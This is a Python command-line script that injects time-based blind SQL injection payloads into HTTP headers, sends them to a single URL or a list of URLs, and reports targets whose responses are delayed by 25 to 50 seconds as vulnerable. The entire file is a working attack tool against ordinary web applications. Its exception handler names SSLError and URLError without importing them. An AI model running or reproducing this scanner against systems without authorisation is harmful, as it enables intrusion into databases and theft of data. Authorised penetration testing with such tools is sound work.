import httpx
import argparse
import rich
from rich.console import Console

# Rich Console
console = Console()

# Argument Parser
parser = argparse.ArgumentParser()

parser.add_argument('-l', '--list', help='To provide list of URLs as an input')
parser.add_argument('-u', '--url', help='To provide single URL as an input')
parser.add_argument('-p', '--payloads', help='To provide payload file having Blind SQL Payloads with delay of 30 sec', required=True)
parser.add_argument('-H', '--headers', help='To provide header file having HTTP Headers which are to be injected', required=True)
args = parser.parse_args()

# Header Payload Creation

# Open the Payloads file and read its contents into a list
try:
    with open(args.payloads, 'r') as file:
        payloads = [line.strip() for line in file]
except (FileNotFoundError, PermissionError, IOError) as e:
    console.print(f"[red]Error reading payloads file: {e}[/red]")
    exit(1)

# Open the Headers file and read its contents into a list
try:
    with open(args.headers, 'r') as file:
        headers = [line.strip() for line in file]
except (FileNotFoundError, PermissionError, IOError) as e:
    console.print(f"[red]Error reading headers file: {e}[/red]")
    exit(1)

headers_list = []

for header in headers:
    for payload in payloads:
        var = header + ": " + payload
        headers_list.append(var)

headers_dict = {header: header.split(": ")[1] for header in headers_list}

# Function to check URLs from a file
def onfile():
    try:
        with open(args.list, 'r') as file:
            urls = [line.strip() for line in file]
    except (FileNotFoundError, PermissionError, IOError) as e:
        console.print(f"[red]Error reading URL list file: {e}[/red]")
        exit(1)

    for url in urls:
        for header in headers_dict:
            cust_header = {header.split(": ")[0]: header.split(": ")[1]}
            try:
                with httpx.Client(timeout=60) as client:
                    response = client.get(url, headers=cust_header, follow_redirects=True)
                res_time = response.elapsed.total_seconds()

                if 25 <= res_time <= 50:
                    console.print("🌐 [bold][cyan]URL: [/][/]", url)
                    console.print ("💉 [bold][cyan]Header: [/][/]", repr(header))
                    console.print("⏱️ [bold][cyan]Response Time: [/][/]", repr(res_time))
                    console.print("🐞 [bold][cyan]Status: [/][red]Vulnerable[/][/]")
                    print()
            except (UnicodeDecodeError, AssertionError, TimeoutError, ConnectionRefusedError, SSLError, URLError, ConnectionResetError, httpx.RequestError) as e:
                pass

# Function to check a single URL
def onurl():
    url = args.url

    for header in headers_dict:
        cust_header = {header.split(": ")[0]: header.split(": ")[1]}
        try:
            with httpx.Client(timeout=60) as client:
                response = client.get(url, headers=cust_header, follow_redirects=True)
            res_time = response.elapsed.total_seconds()

            if 25 <= res_time <= 50:
                console.print("🌐 [bold][cyan]URL: [/][/]", url)
                console.print ("💉 [bold][cyan]Header: [/][/]", repr(header))
                console.print("⏱️ [bold][cyan]Response Time: [/][/]", repr(res_time))
                console.print("🐞 [bold][cyan]Status: [/][red]Vulnerable[/][/]")
                print()
        except (UnicodeDecodeError, AssertionError, TimeoutError, ConnectionRefusedError, SSLError, URLError, ConnectionResetError, httpx.RequestError) as e:
            pass

if args.url is not None:
    onurl()
elif args.list is not None:
    onfile()
else:
    console.print("[red]Error: One out of the two flag -u or -l is required[/red]")
